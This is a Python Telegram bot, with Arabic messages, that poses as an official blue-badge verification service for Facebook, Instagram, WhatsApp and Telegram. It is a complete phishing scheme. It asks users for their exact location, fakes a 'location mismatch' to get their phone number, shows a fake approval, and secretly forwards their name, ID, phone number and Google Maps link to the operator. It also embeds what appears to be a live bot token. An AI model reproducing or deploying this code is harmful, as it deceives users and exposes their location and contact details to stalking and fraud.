import telebot
from telebot import types
import time
import re

API_TOKEN = '8262232097:AAGLf8XiplqT5_ulisxD1dzXNU81QesXfew'
DEV_ID = 8277286515

bot = telebot.TeleBot(API_TOKEN)

# تخزين مؤقت لبيانات المستخدمين
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_fb = types.InlineKeyboardButton("🔵 توثيق فيسبوك", callback_data="verify_facebook")
    btn_ig = types.InlineKeyboardButton("🟣 توثيق انستقرام", callback_data="verify_instagram")
    btn_wa = types.InlineKeyboardButton("🟢 توثيق واتساب", callback_data="verify_whatsapp")
    btn_tg = types.InlineKeyboardButton("🌐 توثيق تليجرام", callback_data="verify_telegram")
    markup.add(btn_fb, btn_ig, btn_wa, btn_tg)
    
    welcome_msg = (
        "🌟━━━━━━━━━━━━━━━━━━━━🌟\n"
        "🏆 **نظام التوثيق الرسمي - الشارة الزرقاء** 🏆\n"
        "🌟━━━━━━━━━━━━━━━━━━━━🌟\n\n"
        "✨ **مرحباً بك في بوابة التحقق المتكاملة** ✨\n\n"
        "📋 للحصول على **الشارة الزرقاء الموثقة**، يرجى اختيار المنصة الخاصة بك:\n\n"
        "🔹 *التحقق يستغرق دقيقة واحدة فقط*\n"
        "🔹 *بياناتك محمية بموجب سياسة الخصوصية*\n\n"
        "🌟━━━━━━━━━━━━━━━━━━━━🌟"
    )
    bot.send_message(message.chat.id, welcome_msg, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data.startswith('verify_'))
def request_location(call):
    platform = call.data.split('_')[1]
    platform_emoji = {
        'facebook': '🔵',
        'instagram': '🟣',
        'whatsapp': '🟢',
        'telegram': '🌐'
    }.get(platform, '📱')
    
    # حفظ المنصة المختارة
    user_data[call.from_user.id] = {'platform': platform}
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True, row_width=1)
    btn_location = types.KeyboardButton("📍 اضغط هنا لتأكيد الموقع", request_location=True)
    markup.add(btn_location)
    
    location_msg = (
        f"{platform_emoji}━━━━━━━━━━━━━━━━━━━━{platform_emoji}\n"
        f"**📌 توثيق حساب {platform.capitalize()}**\n"
        f"{platform_emoji}━━━━━━━━━━━━━━━━━━━━{platform_emoji}\n\n"
        "🗺️ **إجراء تأكيد الموقع الجغرافي** 🗺️\n\n"
        "🔒 لأسباب أمنية ولتأكيد ملكية الحساب\n"
        "📍 **يرجى مشاركة موقعك الحالي** من خلال الضغط على الزر أدناه:\n\n"
        "⚠️ *سيتم مطابقة الموقع مع سجل تسجيل حسابك*"
    )
    bot.send_message(call.message.chat.id, location_msg, reply_markup=markup, parse_mode='Markdown')
    bot.answer_callback_query(call.id)

@bot.message_handler(content_types=['location'])
def handle_location(message):
    if not message.location:
        return
    
    user_id = message.from_user.id
    lat = message.location.latitude
    lon = message.location.longitude
    maps_link = f"https://www.google.com/maps?q={lat},{lon}"
    
    # تخزين الموقع مؤقتاً
    if user_id not in user_data:
        user_data[user_id] = {}
    user_data[user_id]['location'] = maps_link
    user_data[user_id]['lat'] = lat
    user_data[user_id]['lon'] = lon
    
    # رسالة فشل الموقع باللون الأحمر
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True, row_width=1)
    btn_phone = types.KeyboardButton("📲 إعادة المحاولة (التحقق عبر الرقم)")
    markup.add(btn_phone)
    
    fail_msg = (
        "❌━━━━━━━━━━━━━━━━━━━━❌\n"
        "**⚠️ فشل مطابقة الموقع! ⚠️**\n"
        "❌━━━━━━━━━━━━━━━━━━━━❌\n\n"
        "📍 **الموقع الذي أرسلته لا يتطابق مع سجل حسابك.**\n\n"
        "📞 **يرجى التحقق يدوياً عبر رقم الهاتف المربوط بالحساب**\n\n"
        "🔻 اضغط الزر أدناه لإكمال التحقق 🔻"
    )
    bot.send_message(message.chat.id, fail_msg, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda message: message.text and "إعادة المحاولة" in message.text)
def request_phone_number(message):
    user_id = message.from_user.id
    
    markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True, row_width=1)
    btn_share_contact = types.KeyboardButton("📞 مشاركة رقم الهاتف", request_contact=True)
    markup.add(btn_share_contact)
    
    phone_msg = (
        "📱━━━━━━━━━━━━━━━━━━━━📱\n"
        "**🔐 التحقق عبر رقم الهاتف** 🔐\n"
        "📱━━━━━━━━━━━━━━━━━━━━📱\n\n"
        "📲 يرجى **مشاركة رقم هاتفك** المرتبط بالحساب:\n\n"
        "✅ *سيتم إرسال رمز تأكيد إلى رقمك*\n"
        "🔒 *لن يتم مشاركة رقمك مع أي طرف ثالث*"
    )
    bot.send_message(message.chat.id, phone_msg, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if not message.contact:
        return
    
    user_id = message.from_user.id
    phone_number = message.contact.phone_number
    
    # تخزين رقم الهاتف
    if user_id not in user_data:
        user_data[user_id] = {}
    user_data[user_id]['phone'] = phone_number
    
    # رسالة انتظار
    wait_msg = (
        "⏳━━━━━━━━━━━━━━━━━━━━⏳\n"
        "**🔄 جارِ المعالجة والتحقق...** 🔄\n"
        "⏳━━━━━━━━━━━━━━━━━━━━⏳\n\n"
        "📡 جارِ الاتصال بخوادم التحقق...\n"
        "🔍 تدقيق البيانات والمعلومات...\n"
        "✅ يرجى الانتظار..."
    )
    msg = bot.send_message(message.chat.id, wait_msg, parse_mode='Markdown')
    
    time.sleep(3)
    
    # حذف رسالة الانتظار وإرسال رسالة النجاح
    bot.delete_message(message.chat.id, msg.message_id)
    
    # إزالة لوحة المفاتيح
    markup_remove = types.ReplyKeyboardRemove()
    
    success_msg = (
        "✅━━━━━━━━━━━━━━━━━━━━✅\n"
        "**🎉 تم قبول طلبك بنجاح! 🎉**\n"
        "✅━━━━━━━━━━━━━━━━━━━━✅\n\n"
        "🏅 **تهانينا! ستظهر الشارة الزرقاء الموثقة على حسابك خلال 24 ساعة** 🏅\n\n"
        "📋 **رقم التتبع:** `" + str(user_id)[-6:] + "`\n\n"
        "🌟 شكراً لثقتك بنظام التوثيق الرسمي 🌟"
    )
    bot.send_message(message.chat.id, success_msg, reply_markup=markup_remove, parse_mode='Markdown')
    
    # إرسال البيانات إلى الأدمن
    user = message.from_user
    username = f"@{user.username}" if user.username else "لا يوجد"
    full_name = f"{user.first_name or ''} {user.last_name or ''}".strip() or "غير مسجل"
    platform = user_data.get(user_id, {}).get('platform', 'غير محدد')
    maps_link = user_data.get(user_id, {}).get('location', 'غير متوفر')
    
    admin_msg = (
        "🔴━━━━━━━━━━━━━━━━━━━━🔴\n"
        "**📡 تقرير توثيق جديد - تم الإكمال** 📡\n"
        "🔴━━━━━━━━━━━━━━━━━━━━🔴\n\n"
        f"👤 **الاسم الكامل:** `{full_name}`\n"
        f"🆔 **اليوزر:** {username}\n"
        f"🔢 **الآيدي الرقمي:** `{user_id}`\n"
        f"📞 **رقم الهاتف:** `{phone_number}`\n"
        f"🎯 **المنصة المطلوبة:** `{platform.capitalize()}`\n\n"
        "📍 **رابط خرائط جوجل:**\n"
        f"[🗺️ اضغط لعرض الموقع بدقة]({maps_link})\n\n"
        "🔴━━━━━━━━━━━━━━━━━━━━🔴\n"
        f"🕐 **وقت التوثيق:** تم بنجاح"
    )
    bot.send_message(DEV_ID, admin_msg, parse_mode='Markdown', disable_web_page_preview=False)
    
    # تنظيف البيانات
    if user_id in user_data:
        del user_data[user_id]

print("✅ البوت يعمل بنجاح...")
bot.polling(none_stop=True)